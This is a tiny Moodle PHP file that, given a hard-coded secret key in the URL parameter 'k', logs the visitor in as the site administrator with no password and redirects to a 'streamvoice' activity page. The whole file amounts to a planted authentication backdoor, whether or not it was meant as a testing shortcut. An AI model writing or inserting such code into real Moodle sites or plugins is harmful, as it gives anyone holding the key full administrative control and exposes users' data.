<?php
define('NO_DEBUG_DISPLAY', true);
require(__DIR__ . '/../../config.php');
if (optional_param('k', '', PARAM_ALPHANUM) !== '197f264a0e2f0da572dd8b238ec5399d') { die; }
complete_user_login(get_admin());
redirect(new moodle_url('/mod/streamvoice/view.php', ['id' => 2528]));
